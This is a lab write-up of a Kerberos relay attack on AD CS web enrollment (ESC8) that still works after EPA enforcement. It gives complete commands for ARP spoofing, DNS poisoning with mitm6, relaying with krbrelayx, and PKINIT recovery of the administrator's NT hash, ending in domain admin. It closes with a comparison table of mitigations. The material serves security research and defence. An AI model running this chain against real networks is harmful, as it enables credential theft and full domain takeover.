# Lab Variant: ESC8 via Kerberos Relay — Post-EPA Enforcement

## What Changed

This variant adds EPA enforcement to certsrv, establishing a "NTLM relay mitigated" baseline before running the Kerberos relay chain. Everything else is identical to the base lab.

The key point: EPA blocks NTLM relay to certsrv. It does nothing about Kerberos. A relayed Kerberos TGS to an HTTP endpoint without Channel Binding Token enforcement lands just fine, regardless of EPA state.

---

## Step 1: Enable EPA on DC01 (the "patched" baseline)

Unlock the section first — it's locked at parent level by default:

```powershell
Set-WebConfiguration -PSPath "MACHINE/WEBROOT/APPHOST" `
  -Filter "system.webServer/security/authentication/windowsAuthentication" `
  -Metadata "overrideMode" -Value "Allow"
```

Enforce EPA:

```powershell
Set-WebConfigurationProperty -PSPath "IIS:\Sites\Default Web Site\CertSrv" `
  -Filter "system.webServer/security/authentication/windowsAuthentication" `
  -Name "extendedProtection.tokenChecking" -Value "Require"

iisreset
```

Verify:

```powershell
Get-WebConfigurationProperty -PSPath "IIS:\Sites\Default Web Site\CertSrv" `
  -Filter "system.webServer/security/authentication/windowsAuthentication" `
  -Name "extendedProtection.tokenChecking"
# Expected: Require
```

---

## Step 2: Kali — Pre-flight

### VMware promiscuous mode (required after each host reboot)

```bash
sudo chmod a+rw /dev/vmnet0 /dev/vmnet8
```

### Enable IPv6 on Kali interface

mitm6 requires IPv6 link-local even in `--only-dns` mode:

```bash
sudo sysctl -w net.ipv6.conf.eth0.disable_ipv6=0
sudo ip addr add fe80::1/64 dev eth0 scope link
```

### Enable IP forwarding

```bash
sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
```

---

## Step 3: DNS Interception

WEB01B uses DC01 (192.168.1.4) as its DNS server directly. ARP spoof alone doesn't intercept DNS queries sent point-to-point. Two fixes required:

### iptables DNAT rule

```bash
sudo iptables -t nat -A PREROUTING -s 192.168.1.242 -p udp --dport 53 -j DNAT --to-destination 192.168.1.218:53
```

### Manual DNS override on WEB01B (elevated PowerShell)

```powershell
netsh interface ipv4 set dns "Ethernet0" static 192.168.1.218
ipconfig /flushdns
```

> Note: command may return "The configured DNS server is incorrect" but still applies. Verify with `ipconfig /all` — DNS Servers should show 192.168.1.218.

Confirm poisoning is working:

```powershell
nslookup fileserver.lab2019.local
# Expected: CNAME → dc01.lab2019.local, A record → 192.168.1.218
```

---

## Step 4: Attack Execution

**Terminal 1 — ARP spoof (victim → gateway):**
```bash
sudo arpspoof -i eth0 -t 192.168.1.242 192.168.1.1
```

**Terminal 2 — ARP spoof (gateway → victim):**
```bash
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.242
```

**Terminal 3 — mitm6-cname:**
```bash
sudo python3 mitm6-cname.py \
  -d lab2019.local \
  --cname-source-all \
  --cname dc01.lab2019.local \
  --only-dns
```

**Terminal 4 — krbrelayx:**
```bash
sudo python3 krbrelayx.py \
  --target http://dc01.lab2019.local/certsrv/certfnsh.asp \
  --adcs \
  --template User \
  --victim jsmith
```

**Trigger from WEB01B as jsmith:**
```powershell
Invoke-WebRequest -Uri "http://fileserver.lab2019.local/" -UseDefaultCredentials
```

---

## Step 5: PKINIT → NT Hash → DA

```bash
python3 ~/PKINITtools/gettgtpkinit.py \
  -cert-pfx ~/krbrelayx/<output>.pfx \
  -dc-ip 192.168.1.4 \
  lab2019.local/administrator \
  ~/PKINITtools/admin.ccache

export KRB5CCNAME=~/PKINITtools/admin.ccache

python3 ~/PKINITtools/getnthash.py \
  -key <AS-REP key from above> \
  -dc-ip 192.168.1.4 \
  lab2019.local/administrator

nxc smb 192.168.1.4 -u administrator -H <NT hash>
# Expected: Pwn3d!
```

---

## Operational Notes

### Cert filename vs cert identity

krbrelayx names the output PFX based on the `--victim` argument. The actual cert identity is determined by which Kerberos ticket was relayed — not the filename. Always verify against the CA database:

```powershell
certutil -view -restrict "RequestID=<ID>" -out "Request.RequestID,Request.RequesterName,Request.SubmittedWhen,CertificateTemplate"
```

### Background traffic wins the race

With `--victim jsmith` set, background Kerberos traffic from Administrator's session may still win the relay race. In this lab, both certs were issued to `LAB2019\Administrator` despite the victim filter. The filename said `jsmith.pfx`; the cert said Administrator. The CA database is ground truth.

This is operationally significant: in a real environment, high-privilege accounts generating background Kerberos traffic are relay targets of opportunity — no user interaction required.

### Verifying cert freshness — the ojtester check

After confirming the attack worked, a second run was done with the output file deliberately named `ojtester.pfx` — a nonsense name with no relation to any account in the domain. PKINIT succeeded and recovered the same NT hash.

This served two purposes:

1. Confirmed the PFX filename has zero bearing on cert identity or PKINIT outcome — the cert inside is determined entirely by which Kerberos ticket was relayed, not what krbrelayx calls the file
2. Ruled out any possibility of replaying cached credentials from a prior run — fresh cert, fresh AS-REP key, same NT hash because it's the same account

The CA database remains the only ground truth for cert identity. The filename is krbrelayx's housekeeping, nothing more.

---

### PKINIT username must match cert UPN

`KDC_ERR_CLIENT_NAME_MISMATCH` means the username passed to gettgtpkinit.py doesn't match the UPN in the cert SAN. Check cert contents before running PKINIT:

```bash
certipy cert -pfx <file>.pfx
```

Match the username argument to the UPN shown, not the PFX filename.

---

## Summary

| Control | Blocks NTLM relay | Blocks Kerberos relay |
|---------|------------------|-----------------------|
| EPA = Require | ✅ | ❌ |
| HTTPS only | ✅ | ❌ |
| CBT enforcement | ✅ | ✅ |

EPA and HTTPS address the NTLM path. Only CBT enforcement on the HTTP endpoint closes the Kerberos relay path. These are three different controls for three different problems.
